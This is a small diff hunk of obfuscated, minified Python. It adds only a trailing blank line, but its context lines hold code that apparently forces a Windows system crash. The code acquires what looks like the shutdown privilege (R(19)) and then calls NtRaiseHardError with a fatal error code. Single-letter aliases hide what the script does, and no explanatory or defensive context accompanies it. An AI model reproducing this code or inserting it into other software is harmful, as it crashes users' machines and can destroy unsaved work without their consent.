@@ -18,3 +18,4 @@ def S(error_code,options=6):I.NtRaiseHardError(error_code,0,0,0,options,D(M(0)))
 T=19
 if R(T):S(3221226005)
 else:B.exit()
+
